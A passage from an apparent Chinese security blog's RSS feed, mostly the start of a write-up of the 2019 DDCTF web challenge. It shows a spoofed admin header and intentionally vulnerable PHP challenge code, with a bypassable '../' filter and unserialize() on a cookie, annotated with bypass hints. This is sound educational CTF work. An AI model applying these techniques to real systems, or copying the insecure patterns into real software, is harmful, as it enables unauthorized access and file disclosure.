&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;19QiVdLVN-6NCQPy7Zla1BA.jpeg&#34; alt=&#34;img&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google_Game</title>
      <link>https://dragonbox.top/posts/ctf-google-game/</link>
      <pubDate>Wed, 12 Jun 2019 19:41:56 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-google-game/</guid>
      <description>&lt;h1 id=&#34;google-xss-game&#34;&gt;Google Xss game&lt;/h1&gt;</description>
    </item>
    <item>
      <title>2019 DDCTF web</title>
      <link>https://dragonbox.top/posts/ctf-2019-ddctf-web/</link>
      <pubDate>Sat, 11 May 2019 13:58:05 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-2019-ddctf-web/</guid>
      <description>&lt;p&gt;考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。&lt;/p&gt;
&lt;h2 id=&#34;web-签到题&#34;&gt;web 签到题&lt;/h2&gt;
&lt;p&gt;点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送&lt;code&gt;Auth.php&lt;/code&gt;请求，其中有&lt;code&gt;didictf_username&lt;/code&gt;字段，尝试添加成为&lt;code&gt;didictf_username: admin&lt;/code&gt;。成功登陆。&lt;/p&gt;
&lt;p&gt;然后在返回包中显示出了一个&lt;code&gt;php文件&lt;/code&gt;，尝试访问看到了&lt;code&gt;Session.php&lt;/code&gt;的源代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Application&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;($data, $errMsg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;errMsg&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $errMsg,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $data];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_encode&lt;/span&gt;($ret);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-type: application/json&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $ret;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;auth&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $DIDICTF_ADMIN &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; $DIDICTF_ADMIN) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;抱歉，您没有登陆权限，请获取权限后访问-----&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sanitizepath&lt;/span&gt;($path) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;trim&lt;/span&gt;($path);&lt;span style=&#34;color:#75715e&#34;&gt;//去掉空格
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  $path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,$path);&lt;span style=&#34;color:#75715e&#34;&gt;//过滤第一
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  $path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;..\\&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,$path);&lt;span style=&#34;color:#75715e&#34;&gt;//过滤第二
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $path;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#75715e&#34;&gt;//
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sanitizepath&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// ....//config/flag.php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($path) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) {&lt;span style=&#34;color:#75715e&#34;&gt;//../config/flag.php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;($data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($path),&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;include &amp;#39;Application.php&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;class Session extends Application {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  //key建议为8位字符串
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $eancrykey                  = &amp;#39;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_expiration			= 7200;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_name                = &amp;#39;ddctf_id&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_path				= &amp;#39;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_domain				= &amp;#39;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_secure				= FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $activity                   = &amp;#34;DiDiCTF&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  public function index()
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	if(parent::auth()) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;get_key();
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          if($this-&amp;gt;session_read()) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = &amp;#39;DiDI Welcome you %s&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = sprintf($data,$_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              parent::response($data,&amp;#39;sucess&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }else{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $this-&amp;gt;session_create();
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = &amp;#39;DiDI Welcome you&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              parent::response($data,&amp;#39;sucess&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  private function get_key() {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      //eancrykey  and flag under the folder
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $this-&amp;gt;eancrykey =  file_get_contents(&amp;#39;../config/key.txt&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  public function session_read() {//target1: 绕过所有false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(empty($_COOKIE)) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;           return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//cookie not empty
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = $_COOKIE[$this-&amp;gt;cookie_name];
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!isset($session)) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#34;session not found&amp;#34;,&amp;#39;error&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ddctf_id 不能为空
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($hash !== md5($this-&amp;gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#34;the cookie data not match&amp;#34;,&amp;#39;error&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = unserialize($session);//ddctf_id 反序列化
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!is_array($session) OR !isset($session[&amp;#39;session_id&amp;#39;]) OR !isset($session[&amp;#39;ip_address&amp;#39;]) OR !isset($session[&amp;#39;user_agent&amp;#39;])){
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??
